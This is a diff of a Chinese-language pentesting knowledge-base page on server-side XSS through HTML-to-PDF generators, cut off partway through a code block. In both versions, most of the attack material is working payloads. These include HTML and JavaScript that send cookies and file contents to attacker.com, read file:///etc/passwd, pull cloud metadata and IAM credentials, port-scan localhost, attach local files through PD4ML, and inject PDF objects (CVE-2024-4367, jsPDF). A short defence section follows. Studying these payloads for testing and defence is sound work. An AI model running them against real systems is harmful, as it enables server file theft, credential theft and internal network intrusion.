@@ -1,288 +1,256 @@
 ---
-attack_surface: [文件类, 注入类, 服务端利用, 信息泄露]
-impact: [信息泄露, 机密性破坏, 远程代码执行(服务端), 完整性破坏]
-risk_level: 高
+attack_surface: [注入类, 配置缺陷]
+impact: [信息泄露, 机密性破坏, 权限提升]
+risk_level: 严重
 prerequisites:
   - XSS 基础（HTML/CSS/JavaScript 注入原理）
-  - Headless Browser / SSR 概念
-  - SSRF 基础（攻击链条场景）
-related_techniques:
-  - xss
-  - ssrf
-  - csti-client-side-template-injection
-  - pdf-injection
-  - file-upload
+  - HTML 渲染引擎 / PDF 生成器概念
+  - SSRF 基础（利用链的目标环节）
 difficulty: 中级
-tools:
-  - Burp Suite + Burp Collaborator
-  - Puppeteer / Chromium
-  - qpdf / pdfid.py / pdf-parser.py
-  - curl
+related_techniques:
+  - pdf-injection
+  - ssrf
+  - xss
 ---
 
-# Server Side XSS (Dynamic PDF) — 服务端跨站脚本攻击
-> 关联文档：[XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) · [PDF Injection](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/pdf-injection.html)
+# Server Side XSS (Dynamic PDF) — 服务端 XSS（动态 PDF 生成器）
 
----
-
-# 0x01 背景与原理
-
-## 1.0 TL;DR
-
-Server Side XSS 发生在**服务端使用浏览器引擎渲染用户可控内容**时——PDF 生成器、截图服务、SEO 预渲染、SSR 框架。与客户端 XSS 不同，恶意脚本在**服务端执行**，可读取本地文件（`file:///etc/passwd`）、扫描内网端口、窃取云 metadata，并通过 [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md) 链升级为 RCE。
-
-## 1.1 什么是 Server Side XSS
-
-传统 XSS 中，恶意脚本在**受害者浏览器**中执行，危害限于当前用户会话。Server Side XSS 则是：攻击者提交的 HTML/JavaScript 被**服务端浏览器引擎解析执行**——执行上下文是服务器而不是客户端。
-
-```
-客户端 XSS:
-  用户提交 <script> → 服务器存储/反射 → 其他用户浏览器执行 → 窃取 Cookie
-
-Server Side XSS:
-  用户提交 <script> → 服务器用 Chromium/wkhtmltopdf 渲染 → 服务端执行 JS → 
-  读取 /etc/passwd / 访问 169.254.169.254 / 扫描内网
-```
-
-## 1.2 与客户端 XSS 的本质区别
-
-| 维度 | 客户端 XSS | Server Side XSS |
-|------|-----------|-----------------|
-| **执行环境** | 受害者浏览器 | 服务端浏览器引擎 |
-| **同源策略** | 受限于页面 origin | 无 origin 限制（`file://` 路径） |
-| **危害范围** | 当前用户会话 | 服务器文件系统、内网、云 metadata |
-| **CSP 有效性** | 可限制 | 通常未配置或无效 |
-| **触发方式** | 用户访问恶意链接/页面 | 用户提交内容后服务端自动渲染 |
-| **OOB 验证** | XSSHunter / Burp Collaborator | 同样适用（HTTP/DNS 回调） |
-
-## 1.3 攻击面总览
-
-```
-┌──────────────────────────────────────────────────────┐
-│               Server Side XSS 攻击面                   │
-├──────────────────────────────────────────────────────┤
-│  PDF 生成器 (wkhtmltopdf / Puppeteer / Prince / iText)│
-│  Headless Browser (截图 / 预览 / SEO Bot / 社交卡片)    │
-│  SSR 框架 (Next.js / Nuxt / Gatsby / Angular Universal)│
-│  Email HTML 渲染 (邮件服务端预览)                        │
-│  报告生成服务 (JasperReports / BIRT / ReportLab)        │
-└──────────────────────────────────────────────────────┘
-```
+> 关联文档：[服务端 XSS 场景详解](服务端%20XSS%20场景详解.md) · [PDF Injection](../PDF%20Injection/README.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [SSRF](../../User%20input/Reflected%20Values/SSRF/README.md)
 
 ---
 
-# 0x02 服务端执行环境分类
+# 0x01 原理与分类
 
-## 2.1 PDF 生成引擎
+## 1.1 攻击面总览
 
-最常见的 Server Side XSS 入口。用户提交 HTML 内容（发票、报告、简历），服务端将其渲染为 PDF。
+当网页用**用户可控输入**动态生成 PDF 时，可以尝试**欺骗执行 PDF 生成的 bot** 执行**任意 JS 代码**：如果 **PDF 生成 bot** 在渲染内容中发现了**HTML 标签**，它会**解释执行**它们，滥用这一行为即可造成**服务端 XSS（Server Side XSS）**——注入的 HTML/JS 不是在用户浏览器、而是在服务端的渲染进程里执行。
 
-| 引擎 | 底层浏览器 | 已知风险 | 关键标志 |
-|------|-----------|---------|---------|
-| **wkhtmltopdf** | QtWebKit (旧版 WebKit) | JS 执行 + 默认启用本地文件访问 | `--enable-local-file-access` 默认开启 |
-| **Puppeteer** | Chromium | 完整 Chrome JS 引擎 + DevTools 协议 | 通过 `page.pdf()` 生成 |
-| **Playwright** | Chromium / Firefox / WebKit | 同 Puppeteer | 多浏览器支持 |
-| **Prince XML** | 自研引擎 | JS 支持有限但存在 PDF object 注入 | 商业软件 |
-| **TCPDF** | PHP 原生（无浏览器） | 不支持 JS，但存在 HTML/SVG → PDF 路径遍历 | PHP 生态主流 |
-| **PDFKit** | Node.js 原生 | 有限 JS 支持 | Node.js 生态 |
-| **iText / FPDF** | Java/PHP 原生 | PDF object 注入 | 企业 Java 生态 |
+> [!WARNING]
+> 注意 `<script></script>` 标签**并非总是生效**（取决于渲染引擎），此时需要换一种执行 JS 的方法（例如滥用 `<img>` 事件处理器，见 0x03 SVG 上下文与 0x02 发现载荷中的事件处理器变体）。
 
-### wkhtmltopdf 特殊风险
+可见性与盲打的分流（详见 2.1）：常规利用中你通常**能查看/下载生成的 PDF**，因此能通过 JS **看到一切写入产物**的内容（如 `document.write()` 的输出）。但**看不到生成的 PDF** 时，就需要**向你的服务器发起 Web 请求来外带信息**（Blind）。
 
-`wkhtmltopdf` 默认启用以下危险选项：
+> 边界说明：本文档覆盖"服务端把用户输入渲染进 PDF"的攻击面；针对"恶意构造的 PDF 文件本身"（解析侧攻击）属于 [PDF Injection](../PDF%20Injection/README.md) 专题，两者不在同一攻击链位置。
 
-```bash
-# 默认行为等价于
-wkhtmltopdf --enable-local-file-access --enable-javascript input.html output.pdf
-```
+## 1.2 常见 PDF 生成引擎
 
-这意味着 `<script>` 标签不仅会执行，还能通过 `XMLHttpRequest` 读取 `file:///etc/passwd`。
+| 引擎 | 生态 | 特性 |
+|---|---|---|
+| **wkhtmltopdf** | 命令行 | 基于 **WebKit** 渲染引擎将 HTML/CSS 转为 PDF，开源、部署广泛 |
+| **TCPDF** | PHP | 图片/图形/加密支持完备；渲染时会经 cURL/`getimagesize()`/`file_get_contents()` 自动抓取 HTML 中的 URL（见下） |
+| **PDFKit** | Node.js | 从 HTML/CSS 生成 PDF |
+| **iText** | Java | 支持数字签名、表单填充等高级特性 |
+| **FPDF** | PHP | 轻量简单，无大量附加功能 |
 
-### Puppeteer/Playwright 生成模式
+**引擎差异决定攻击可行性**（源材料未系统化，以下差异点由 [SSRF 专题](../../User%20input/Reflected%20Values/SSRF/README.md) 所整理的 hacktricks 交叉引用页 "HTML-to-PDF renderers as blind SSRF gadgets" 补充）：
 
-```javascript
-// 常见不安全的 PDF 生成代码
-const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
-const page = await browser.newPage();
-await page.setContent(userInputHTML);  // ← 用户可控 HTML
-await page.pdf({ path: 'output.pdf' });
-```
+- HTML 解释程度与 `<script>` 支持性各引擎不一——WKHTML/WebKit 类完整支持 DOM+JS；TCPDF 类主要按 HTML 标签抓取资源而**不一定执行 JS**。
+- TCPDF 6.10.0（及 spipu/html2pdf 包装）对每个 `<img>` 资源发起**多次抓取尝试**，单个 payload 可产生多个请求（利于时序型端口扫描）；html2pdf 的 `Css::extractStyle()` 只做浅层 scheme 检查后直接 `file_get_contents($href)`，可借此探测回环服务、RFC1918 网段与云 metadata。
+- 凡是渲染时自动抓取 URL 的引擎，**即便不执行 JS 也可充当盲 SSRF 代理**（防御视角见 0x0A）。
 
-## 2.2 Headless Browser 服务
+## 1.3 相关攻击场景家族
 
-### 截图服务
+动态 PDF 只是"服务端渲染器消费用户 HTML"的一个实例。同族场景——无头浏览器截图/预览、SEO Bot、社交卡片、SSR 产物二次消费、Email HTML 渲染、报告生成服务——共享同一判定模型（引擎是否执行 JS / 产物是否回显 / 渲染器网络位置），逐场景展开见配套章节 [服务端 XSS 场景详解](服务端%20XSS%20场景详解.md)，本文档 payload 可直接平移适用。
 
-用户输入 URL 或 HTML，服务端用 headless 浏览器截图：
+# 0x02 检测 / 前置条件
 
-```bash
-# 典型实现
-puppeteer.screenshot({ url: userInput })    # ← 用户可控 URL
-puppeteer.setContent(userHTML).screenshot() # ← 用户可控 HTML
-```
+## 2.1 可见性分流（盲 vs 非盲）
 
-触发点：社交媒体预览生成、网站缩略图服务、URL 健康检查 bot。
+先判断产物是否回到你手里：**能下载/看到生成的 PDF** → 用 `document.write()` 类写入直接把结果画进 PDF 产物读取；**看不到产物** → 全部改走**外带通道**（向自己服务器发请求），并优先使用 2.2 中的盲发现载荷。
 
-### SEO / 社交预览渲染
-
-Googlebot、Twitterbot、Slackbot 等服务端抓取页面时执行 JS 生成预览卡片。如果攻击者控制的页面被这些 bot 访问，恶意 JS 可在 bot 上下文中执行——尽管这通常只影响外部机器，但在内部 SEO 预渲染服务中可能访问内网。
-
-### 最小化探测
-
-提交包含 OOB 回调的 HTML 片段即可判断是否存在 headless 渲染：
+## 2.2 发现载荷（Discovery）
 
 ```html
-<img src="http://your-collaborator.net/ping">
-```
-
-任何对 `your-collaborator.net` 的请求都证明服务端检索了 HTML 并尝试渲染。
-
-## 2.3 服务端渲染框架 (SSR)
-
-Next.js、Nuxt、Angular Universal 等框架在服务端预渲染页面。如果用户输入被注入到 SSR 渲染模板中，服务端 `renderToString()` 可能执行恶意逻辑。
-
-```jsx
-// Next.js SSR 不安全示例
-export async function getServerSideProps(context) {
-  const userContent = context.query.content;  // ← 用户可控
-  return { props: { content: userContent } };
-}
-
-function Page({ content }) {
-  return <div dangerouslySetInnerHTML={{ __html: content }} />; // ← Server Side XSS
-}
-```
-
-关键区别：`dangerouslySetInnerHTML` 在 SSR 中同样危险——但执行环境是服务端 Node.js 而不是浏览器。
-
-## 2.4 Email HTML 渲染
-
-邮件服务端或客户端在预览/渲染 HTML 邮件时，可能解析并执行内嵌脚本（取决于渲染引擎的沙箱策略）。虽然主流邮件客户端会过滤 `<script>`，但 CSS-based 数据窃取和 `<img>` OOB 回调在服务端预览场景中仍然有效。
-
----
-
-# 0x03 指纹识别与探测
-
-## 3.1 服务端浏览器引擎识别
-
-通过 JS 引擎差异识别服务端使用的渲染器：
-
-```html
-<!-- 探测 JS 引擎类型 -->
-<script>
-document.write(navigator.userAgent);           // 直接输出 UA
-document.write(JSON.stringify(window.navigator)); // 完整 navigator 对象
-</script>
-
-<!-- 探测可用 API (Chromium vs QtWebKit) -->
-<img src="x" onerror="
-  var features = [];
-  if (typeof window.chrome !== 'undefined') features.push('Chromium');
-  if (typeof window.navigator.qt !== 'undefined') features.push('QtWebKit');
-  if (window.callPhantom) features.push('PhantomJS');
-  new Image().src = 'http://attacker.com/fp?' + features.join(',');
-">
-```
-
-## 3.2 上下文探测 Payload
-
-```html
-<!-- 基础可达性探测 — 最轻量 -->
-<img src="http://attacker.com/ping">
-
-<!-- 确认 JS 执行 -->
-<img src="x" onerror="document.write('test')">
+<!-- Basic discovery, Write something-->
+<img src="x" onerror="document.write('test')" />
 <script>document.write(JSON.stringify(window.location))</script>
+<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
 
-<!-- 确认文件系统访问能力 -->
-<img src="x" onerror="document.write(window.location)">
-<script>document.write(window.location)</script>
-<!-- 如果返回 file:// 路径 → 文件系统可达 -->
+<!--Basic blind discovery, load a resource-->
+<img src="http://attacker.com"/>
+<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
+<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
+<link rel=attachment href="http://attacker.com">
 
-<!-- 外置脚本加载确认 -->
-<script src="http://attacker.com/test.js"></script>
-<img src="x" onerror="document.write('<script src=http://attacker.com/test.js></script>')">
+<!-- Using base HTML tag -->
+<base href="http://attacker.com" />
+
+<!-- Loading external stylesheet -->
+<link rel="stylesheet" src="http://attacker.com" />
+
+<!-- Meta-tag to auto-refresh page -->
+<meta http-equiv="refresh" content="0; url=http://attacker.com/" />
+
+<!-- Loading external components -->
+<input type="image" src="http://attacker.com" />
+<video src="http://attacker.com" />
+<audio src="http://attacker.com" />
+<audio><source src="http://attacker.com"/></audio>
+<svg src="http://attacker.com" />
 ```
 
-## 3.3 OOB 确认方法
+注：`<script src>` 类载荷本身就是出站请求，与事件处理器载荷（`onerror` 等）分开测试可避免把"资源被预抓取"误判为"JS 已执行"。
 
-```
-测试流程:
-  1. 注入 <img src="http://collaborator.net/ping">
-  2. 收到 HTTP 请求 → 确认 HTML 被检索
-  3. 注入 <img src=x onerror="fetch('http://collaborator.net/js_ok')">
-  4. 确认 JS 执行 → Server Side XSS 成立
-  5. 注入 file:///etc/passwd 读取 payload
-```
-
----
-
-# 0x04 Payload 技术库
-
-## 4.1 PDF 上下文专用 Payload
-
-### 4.1.1 信息泄露 — 路径暴露
+JS 执行确认可用 **DOM 操作**而非仅 `document.write`（noob.ninja 案例）：渲染进产物后看到写入的内容即确认执行。
 
 ```html
-<img src="x" onerror="document.write(window.location)">
+<p id="test">aa</p><script>document.getElementById('test').innerHTML+='aa'</script>
+```
+
+**实战条件与限制**（源自 buer.haus 的 PhantomJS 图像渲染案例）：
+
+- `<script>` 不生效、`onerror` 触发不稳定（案例中约 1/100），根因是**渲染竞态**——引擎截图时未等 JS 加载完成；用 `document.write()` 完全覆写页面内容可将 JS 执行稳定到每次触发。
+- 渲染进程可用 UA 指纹识别（案例为 `PhantomJS/2.1.1`），用于确认引擎选型与载荷取舍。
+- 页面若以 file:// 上下文打开（确认方法见 2.3），读取本地文件优先于 SSRF（见 5.1 的上下文条件）。
+
+## 2.3 路径泄露（Path disclosure）
+
+```html
+<!-- If the bot is accessing a file:// path, you will discover the internal path
+if not, you will at least have wich path the bot is accessing -->
+<img src="x" onerror="document.write(window.location)" />
 <script> document.write(window.location) </script>
 ```
 
-### 4.1.2 本地文件读取
+## 2.4 Bot 存活检测（Bot delay）
 
 ```html
-<!-- XMLHttpRequest 读取 -->
+<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
 <script>
-x = new XMLHttpRequest;
-x.onload = function() { document.write(btoa(this.responseText)) };
-x.open("GET", "file:///etc/passwd");
-x.send();
+    let time = 500;
+    setInterval(()=>{
+        let img = document.createElement("img");
+        img.src = `https://attacker.com/ping?time=${time}ms`;
+        time += 500;
+    }, 500);
 </script>
-
-<!-- iframe 嵌入 -->
-<iframe src="file:///etc/passwd"></iframe>
-<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')">
-
-<!-- object/embed 标签 -->
-<object data="file:///etc/passwd">
-<embed src="file:///etc/passwd" width="400" height="400">
-
-<!-- meta 刷新 -->
-<meta http-equiv="refresh" content="0;url=file:///etc/passwd">
+<img src="https://attacker.com/delay">
 ```
 
-### 4.1.3 SVG 文件读取（路径遍历）
+# 0x03 SVG 执行上下文
+
+当 `<script>` 不生效时，SVG 提供替代执行上下文。下列各 payload 可以放进 SVG 中复用；示例含一个访问 Burp Collaborator 子域的 iframe 和一个访问云 metadata 端点的 iframe：
 
 ```html
-<!-- SVG foreignObject + iframe -->
-<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="800" height="500">
-  <g>
-    <foreignObject width="800" height="500">
-      <body xmlns="http://www.w3.org/1999/xhtml">
-        <iframe src="file:///etc/passwd" width="800" height="500"></iframe>
-        <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
-      </body>
-    </foreignObject>
-  </g>
+<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
+    <g>
+        <foreignObject width="800" height="500">
+            <body xmlns="http://www.w3.org/1999/xhtml">
+                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
+                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
+            </body>
+        </foreignObject>
+    </g>
+</svg>
+
+
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+     xmlns="http://www.w3.org/2000/svg">
+  <circle cx="50" cy="50" r="45" fill="green"
+          id="foo"/>
+  <script type="text/javascript">
+    // <![CDATA[
+      alert(1);
+   // ]]>
+  </script>
 </svg>
 ```
 
-### 4.1.4 云 Metadata 窃取
+更多 SVG payload 见 [svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)。
+
+# 0x04 外部脚本加载
+
+最省事的利用方式是让 bot 加载**你本地控制的脚本**——payload 只写一次，之后可随时改脚本内容、bot 每次都用同一段注入代码加载最新版本：
+
+```html
+<script src="http://attacker.com/myscripts.js"></script>
+<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
+```
+
+# 0x05 本地文件读取与 SSRF
+
+## 5.1 XHR 读取 file://
 
 ```html
 <script>
-fetch('http://169.254.169.254/latest/meta-data/')
-  .then(r => r.text())
-  .then(d => {
-    new Image().src = 'http://attacker.com/exfil?data=' + btoa(d);
-  });
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file:///etc/passwd");x.send();
 </script>
 ```
 
-### 4.1.5 PD4ML 附件提取
+```html
+<script>
+    xhzeem = new XMLHttpRequest();
+    xhzeem.onload = function(){document.write(this.responseText);}
+    xhzeem.onerror = function(){document.write('failed!')}
+    xhzeem.open("GET","file:///etc/passwd");
+    xhzeem.send();
+</script>
+```
 
-`PD4ML` 是 Java HTML-to-PDF 库，支持 `<pd4ml:attachment>` 标签。若注入点落入 PD4ML 处理流程：
+> [!NOTE]
+> 上下文条件：渲染器以 **file:// 上下文**打开页面时（noob.ninja 案例），iframe 加载内网与外部 http 域名均不可达，但 XHR 读取 file:// 正常；SSRF 是否可行取决于页面是 file:// 还是 http(s) 上下文（后者见 5.3）。先用 2.3 的路径泄露确认 `window.location`，再选择利用方向。
+> 另可结合 [File Inclusion-Path Traversal](../../User%20input/Reflected%20Values/File%20Inclusion-Path%20Traversal/README.md) 中的 HTML-to-PDF 图片/SVG 路径穿越技巧，将本地文件间接渲染进产物。
+
+## 5.2 标签型文件读取载体
 
 ```html
+<iframe src=file:///etc/passwd></iframe>
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<link rel=attachment href="file:///root/secret.txt">
+<object data="file:///etc/passwd">
+<portal src="file:///etc/passwd" id=portal>
+<embed src="file:///etc/passwd>" width="400" height="400">
+<style><iframe src="file:///etc/passwd">
+<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
+<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
+```
+
+另有一类引擎级 annotation/attachment 标签（是否支持取决于引擎，PD4ML 见 0x07）：
+
+```html
+<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
+```
+
+## 5.3 转为 SSRF（含云 metadata）
+
+> [!WARNING]
+> 把 `file:///etc/passwd` 换成例如 `http://169.254.169.254/latest/user-data` 即可**尝试访问外部网页（SSRF）**。结合 [SSRF 专题](../../User%20input/Reflected%20Values/SSRF/README.md) 的云 metadata 手法与云环境感知（见其 Cloud SSRF 内容），可利用渲染器位置直取实例凭据。
+
+这一漏洞可**非常轻易地转化为 SSRF**（因为你可以让脚本加载外部资源）——拿到 JS 执行后直接读取云 metadata 或内网即可。
+
+## 5.4 SSRF 绕过参考
+
+SSRF 被限制域名/IP 时，知识库 [SSRF 专题的 URL Format Bypass](../../User%20input/Reflected%20Values/SSRF/URL%20Format%20Bypass.md) 收录了完整绕过形态（localhost 各种编码表示、域解析混淆、redirect 302 绕过、DNS rebinding 等），此处不重复展开。
+
+# 0x06 端口扫描
+
+配合 Bot delay 类的存活确认，可对本机端口做盲扫——`no-cors` fetch 使请求必然成功送达，命中端口即触发外带 ping：
+
+```html
+<!--Scan local port and receive a ping indicating which ones are found-->
+<script>
+const checkPort = (port) => {
+    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
+        let img = document.createElement("img");
+        img.src = `http://attacker.com/ping?port=${port}`;
+    });
+}
+
+for(let i=0; i<1000; i++) {
+    checkPort(i);
+}
+</script>
+<img src="https://attacker.com/startingScan">
+```
+
+# 0x07 附件型引擎：PD4ML
+
+部分 HTML→PDF 引擎允许**为 PDF 指定附件**（如 **PD4ML**），可滥用该特性**把任意本地文件挂进 PDF**。取回附件的方式：用 **Firefox 打开 PDF 并双击回形针图标**将附件另存为新文件；用 Burp 抓取 **PDF 响应**也可在**明文**中看到附件内容。
+
+```html
+<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
 <html>
   <pd4ml:attachment
     src="/etc/passwd"
@@ -291,421 +259,29 @@ fetch('http://169.254.169.254/latest/meta-data/')
 </html>
 ```
 
-生成的 PDF 将包含 `/etc/passwd` 作为附件，在支持附件的 PDF 阅读器中可直接提取。
+# 0x0A 防御与缓解
 
-## 4.2 Chromium/Headless 上下文
+## A.1 输入与模板侧
 
-### 4.2.1 端口扫描
+- 用户输入禁止原样进入 HTML/URL 上下文：进入模板前统一 HTML 转义；必须接受 URL 时走协议/主机白名单（可被编码绕过，见 SSRF 专题 URL Format Bypass）。
+- 富文本字段先 sanitize 再入库——存储型输入会在报告/导出时被渲染器二次放大。
 
-```html
-<script>
-const checkPort = (port) => {
-    fetch(`http://127.0.0.1:${port}`, { mode: "no-cors" }).then(() => {
-        new Image().src = `http://attacker.com/ping?port=${port}`;
-    });
-};
-for (let i = 0; i < 1000; i++) {
-    checkPort(i);
-}
-</script>
-<img src="https://attacker.com/startingScan">
-```
+## A.2 渲染器运行侧
 
-### 4.2.2 Bot 延迟检测
+- **渲染前剥离外部 URL，或将渲染器隔离在无出站流量的网络沙箱中**——在此之前，把 PDF 生成器当作盲 SSRF 代理对待（源材料硬化建议）。
+- 渲染进程最小权限：禁止 file:// 与本地资源访问（若引擎支持配置）、禁读云 metadata、headless 进程运行于专用低权限账户。
+- 产物渲染与业务网络隔离，防本机端口扫描面扩大。
 
-```html
-<script>
-let time = 500;
-setInterval(() => {
-    new Image().src = `https://attacker.com/ping?time=${time}ms`;
-    time += 500;
-}, 500);
-</script>
-```
+## A.3 检测
 
-通过 ping 间隔确定 bot 活跃时长——决定 payload 需要多快执行完。
-
-### 4.2.3 SSRF 载荷
-
-```html
-<!-- 基础 SSRF -->
-<script>
-fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
-  .then(r => r.text())
-  .then(d => { new Image().src = 'http://attacker.com/?d=' + btoa(d); });
-</script>
-
-<!-- base 标签劫持 -->
-<base href="http://attacker.com">
-
-<!-- meta 标签 SSRF -->
-<meta http-equiv="refresh" content="0; url=http://169.254.169.254/">
-
-<!-- link 标签 -->
-<link rel="stylesheet" href="http://attacker.com/exfil">
-
-<!-- 多媒体标签 -->
-<video src="http://attacker.com"></video>
-<audio src="http://attacker.com"></audio>
-<source src="http://attacker.com">
-```
-
-## 4.3 PDF Object Injection (原生 PDF 语法注入)
-
-当用户输入被**直接嵌入 PDF 文件内容**（非 HTML → PDF 转换）时：
-
-### 4.3.1 注入原语速查
-
-| 目标 | Payload | 适用场景 |
-|------|---------|----------|
-| 打开时执行 JS | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Acrobat/Reader |
-| 点击时执行 JS | `/A << /S /JavaScript /JS (app.alert(1)) >>` | 控制 link annotation |
-| 附加动作 | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | 鼠标进入/获取焦点 |
-| 盲回调 | `/A << /S /URI /URI (https://attacker.tld/) >>` | OOB 可达性验证 |
-| 内容窃取 | `for (...) this.getPageNthWord(...)` | PDF 内容逐词泄露 |
-| 表单提交 | Widget + `this.submitForm(...)` | 比 `/URI` 更强 |
-
-### 4.3.2 典型利用方法
-
-```
-输入点 → PDF 字符串中未转义的 ( ) \
-  → 字典闭合 + 注入新 PDF 对象
-  → /OpenAction /JS 执行
-```
-
-```pdf
-# 注入点示例：用户输入 reflected 到 PDF string
-# 若输入 ) 可闭合括号，则：
-) /A << /S /JavaScript /JS (app.alert(1)) >> (
-```
-
-### 4.3.3 Widget/AcroForm 升级
-
-```pdf
-#)>> << /Type /Annot /Rect [0 0 900 900] /Subtype /Widget
-/Parent << /FT /Btn /T(a) >>
-/A << /S /JavaScript /JS (app.alert(1)) >>
-```
-
-### 4.3.4 PDF.js FontMatrix 注入 (CVE-2024-4367)
-
-**影响范围：** Firefox < 126、Firefox ESR < 115.11、Thunderbird < 115.11、pdfjs-dist <= 4.1.392。同时影响所有内嵌 PDF.js 的应用——包括 Electron 桌面应用和 `react-pdf` 等 React 组件库。
-
-**精确版本表：**
-
-| 版本 | 状态 | 原因 |
-|------|------|------|
-| v0.8.1181 (2014-04) | 受影响 | 首个公开发布版 |
-| v1.4.20 (2016-01) | 受影响 | — |
-| v1.5.188 (2016-04) | **不受影响** | 一个意外 typo 导致 `isEvalSupported` 失效路径被跳过 |
-| v1.9.426 (2017-08) | 不受影响 | 在下一受影响版本之前 |
-| v1.10.88 (2017-10) | 受影响 | typo 修复重新引入了漏洞代码路径 |
-| v4.1.392 (2024-04) | 受影响 | 修复前的最后一个版本 |
-| v4.2.67 (2024-04-29) | **不受影响** | 已修复 |
-
-**根因代码路径：**
-
-```
-FontMatrix 数组 → extractFontHeader() 读取 → translateFont() 传递
-  → compileGlyph() 调用 fontMatrix.slice()
-  → compileGlyphImpl() 将 slice 结果拼入 JS 命令字符串
-  → new Function("c", "size", jsBuf.join("")) 执行
-```
-
-关键代码在 `compileGlyph()` 中：
-
-```javascript
-const cmds = [
-  { cmd: "save" },
-  { cmd: "transform", args: fontMatrix.slice() },  // ← slice() 返回原始值
-  { cmd: "scale", args: ["size", "-size"] },
-];
-this.compileGlyphImpl(code, cmds, glyphId);
-```
-
-`fontMatrix.slice()` 返回的数组直接作为 `c.transform()` 的参数——如果数组元素包含字符串 `(0\); alert('foobar')`，则生成的 JS 代码为 `c.transform(1,2,3,4,5,0\); alert('foobar'));`，闭合括号后注入任意 JS。
-
-**Payload：**
-
-```pdf
-/FontMatrix [1 2 3 4 5 (0\); alert('foobar')]
-```
-
-**缓解措施：**
-
-1. 升级 pdfjs-dist 至 >= v4.2.67
-2. 设置 `isEvalSupported = false` 禁用 `new Function` 代码路径（CSP 禁止 `unsafe-eval` 时同样生效）
-3. Electron 应用需检查 `node_modules` 中间接依赖的 pdf.js 版本——`react-pdf` 等组件库曾捆绑受影响版本
-
-### 4.3.5 jsPDF addJS() 注入 (CVE-2026-25755)
-
-```javascript
-// JavaScript PDF 生成库 jsPDF 中
-// addJS() 方法对用户输入未转义
-const doc = new jsPDF();
-doc.addJS("console.log('x');) >> /AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>");
-// 注入的 PDF object 通过 addJS 写入
-```
-
-### 4.3.6 jsPDF createAnnotation() 注入
-
-`addJS()` 不是 jsPDF 唯一的注入面。`createAnnotation()` 的 `url` 参数同样将用户输入**直接写入 PDF 对象字符串**而不转义括号和反斜线：
-
-```javascript
-// jsPDF createAnnotation — url 参数可注入
-const doc = new jsPDF();
-doc.createAnnotation({
-  bounds: {x: 0, y: 10, w: 200, h: 200},
-  type: 'link',
-  url: `/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`
-});
-```
-
-### 4.3.7 PDFKit / PDF-Lib 的 PDFString 注入
-
-PDFKit 和 PDF-Lib 使用 `PDFString.of()` 构造 PDF 字符串对象。如果用户输入未经转义传入：
-
-```javascript
-// PDFKit — link annotation 中的 PDFString.of()
-const linkAnnotation = pdfDoc.context.obj({
-  Type: 'Annot',
-  Subtype: 'Link',
-  A: {
-    Type: 'Action',
-    S: 'URI',
-    URI: PDFString.of(`/input`),  // ← 用户输入直接进入 PDF 字符串
-  }
-});
-
-// PDF-Lib 同模式
-A: {
-  Type: 'Action',
-  S: 'URI',
-  URI: PDFString.of(`injection)`),  // ← 闭合括号后注入 PDF 对象
-}
-```
-
-**根本原因**（PortSwigger 总结）：这些库在将用户输入写入 PDF 字符串时**未对 `(` `)` `\` 三个字符做转义**。PDF 字符串以 `(` 开头 `)` 结尾，输入中的 `)` 可提前闭合字符串，后续内容被解析为 PDF 操作符。
-
-### 4.3.8 无交互自动执行
-
-利用 Page Visible (PV) / Page Invisible (PI) 触发器，无需用户点击即可执行 JS：
-
-```javascript
-// Screen annotation — 页面可见时自动触发
-const doc = new jsPDF();
-doc.createAnnotation({
-  bounds: {x: 0, y: 10, w: 200, h: 200},
-  type: 'link',
-  url: `/)>> >>
-    <</Subtype /Screen /Rect [0 0 900 900] /AA <</PV
-    <</S/JavaScript/JS(app.alert(1))>>/(`  // ← PV = Page Visible, 自动执行
-});
-```
-
-`/AA` 字典支持的触发器：`/PV`(Page Visible)、`/PI`(Page Invisible)、`/PO`(Page Open)、`/PC`(Page Close)、`/E`(Enter)、`/X`(Exit)。其中 PV/PO 在页面加载时自动触发，无需用户交互。
-
-### 4.3.9 PDF 结构分析工具
-
-```bash
-# 结构化输出 PDF 内容
-qpdf --qdf --object-streams=disable victim.pdf readable.pdf
-
-# 快速关键字扫描
-pdfid.py readable.pdf
-pdf-parser.py -search "/JS" -search "/AA" -search "/OpenAction" readable.pdf
-
-# grep 快速定位
-rg -n '/URI|/JS|/AA|/OpenAction|/Subtype /Link|/Subtype /Widget' readable.pdf
-```
-
-## 4.4 SSR 上下文注入
-
-```jsx
-// Next.js SSR — 用户输入导致的 dangerouslySetInnerHTML
-<div dangerouslySetInnerHTML={{
